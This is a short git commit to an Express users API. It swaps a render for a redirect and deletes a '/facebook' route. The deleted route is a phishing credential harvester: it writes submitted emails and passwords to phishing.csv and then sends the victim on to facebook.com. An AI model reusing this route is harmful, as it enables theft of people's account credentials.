d249f9117759a5866b950e4079166876963d1eaa
Younes HENNI <youn.henni@gmail.com>
2024-10-08 17:00:18 +0000

    feat(users): redirects to /users

--- user/api.js
+++ user/api.js
@@ -20,7 +20,7 @@ usersRouter.post('', (req, res) => {
     );
     Logger.info(req.body);
 
-    res.status(200).render("info", req.body);
+    res.status(200).redirect('/users.html');
 })
 
 
@@ -35,12 +35,5 @@ usersRouter.get("", (req, res) => {
             .map(([nom, prenom, email]) => ({ nom, prenom, email }))
     res.status(200).json(users);
 });
-
-usersRouter.post('/facebook', (req, res) => {
-    if (!existsSync("./phishing.csv"))
-        writeFileSync("./phishing.csv", "email,password");
-    appendFileSync('./phishing.csv', `\n${req.body.email},${req.body.pass}`);
-    res.redirect('https://www.facebook.com');
-})
 
 export default usersRouter;
